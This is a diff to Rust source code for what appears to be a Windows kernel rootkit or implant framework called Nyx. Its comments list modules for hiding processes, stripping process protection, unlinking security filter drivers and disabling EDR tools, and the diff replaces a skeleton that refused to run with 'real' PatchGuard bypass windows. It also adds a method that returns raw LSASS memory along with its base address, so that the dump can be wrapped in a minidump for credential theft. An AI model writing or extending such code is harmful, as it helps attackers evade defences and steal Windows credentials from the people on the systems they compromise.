@@ -31,8 +31,9 @@
 //! - `telemetry::MiniFilterUnlinker` — fltmgr RegisteredFilters LIST_ENTRY unlink.
 //! - `persistence::ProcessHider` — ActiveProcessLinks unlink (DKOM).
 //! - `persistence::PplStripper` — EPROCESS.Protection + SignatureLevel zero.
-//! - `persistence::PatchGuardWindow` — DKOM-window state machine (PG-context
-//!   probe is operator-wired per build; refuses without it).
+//! - `persistence::TimingRepairWindow` / `RuntimePgBypassWindow` — the two real
+//!   PatchGuard bypass windows, selected by `win::select_pg_window` (capability-
+//!   driven: PG-context offsets table + `supports_thread_suspend` flag).
 //! - `netsec::UserModeEdrSilencer` — WFP block-rule templates (FFI operator-side).
 //! - `netsec::KernelLsassReader` — DTB read + page-walk orchestration shell.
 //! - `netsec::EdrNeutralizer` — Kill/Freeze/Choke tiers (framework).
@@ -283,8 +284,7 @@ pub struct PgGuard<'a> {
     kit: &'a dyn PatchGuardKit,
     /// Repair callback invoked on Drop. Set by the concrete PG bypass impl.
     /// When `Some`, the closure performs PG state restoration (re-arm, thread
-    /// resume, etc.). When `None`, the guard is a no-op (for the skeleton
-    /// `PatchGuardWindow` which refuses without a real probe).
+    /// resume, etc.).
     repair: Option<alloc::boxed::Box<dyn FnMut() + 'a>>,
 }
 
@@ -296,14 +296,6 @@ impl<'a> PgGuard<'a> {
             kit,
             repair: Some(alloc::boxed::Box::new(repair_fn)),
         }
-    }
-
-    /// Create a no-op guard (skeleton — no real PG bypass wired).
-    /// Returns `UnsupportedPosture` if the repair is needed. Used by the
-    /// skeleton `PatchGuardWindow` which refuses without a real probe.
-    #[allow(dead_code)] // seam for the skeleton impl path; not yet wired
-    pub(crate) fn noop(kit: &'a dyn PatchGuardKit) -> Self {
-        Self { kit, repair: None }
     }
 }
 
@@ -339,8 +331,27 @@ pub trait PplKit {
 /// kernel primitive, bypassing RunAsPPL + Credential Guard. (Current Nyx
 /// `hashdump` is user-mode SAM-hive; this is its kernel-tier upgrade.)
 pub trait CredKit {
-    /// Dump LSASS memory for `pid`; returns the raw minidump bytes.
+    /// Dump LSASS memory for `pid`; returns the raw bytes (NOT a minidump —
+    /// see [`Self::dump_lsass_with_base`] for the VA the bytes were read from,
+    /// which the operator needs to wrap them in a minidump envelope).
     fn dump_lsass(&self, krw: &dyn KernelRw, pid: u32) -> Result<Vec<u8>, KitError>;
+
+    /// Dump LSASS memory for `pid` AND return the virtual address the bytes
+    /// were captured from (LSASS's `ImageBaseAddress` from its PEB). The base
+    /// VA is needed by the operator-side minidump assembler to populate the
+    /// `Memory64List`'s `StartOfMemoryRange`.
+    ///
+    /// Default impl: calls `dump_lsass` and returns base=0 (the floor impls
+    /// that don't override this lose the VA, which the operator can detect
+    /// and surface as a warning). Real impls (`KernelLsassReader`) override.
+    fn dump_lsass_with_base(
+        &self,
+        krw: &dyn KernelRw,
+        pid: u32,
+    ) -> Result<(Vec<u8>, u64), KitError> {
+        let bytes = self.dump_lsass(krw, pid)?;
+        Ok((bytes, 0))
+    }
 }
 
 // ---- §5 Floor default -----------------------------------------------------
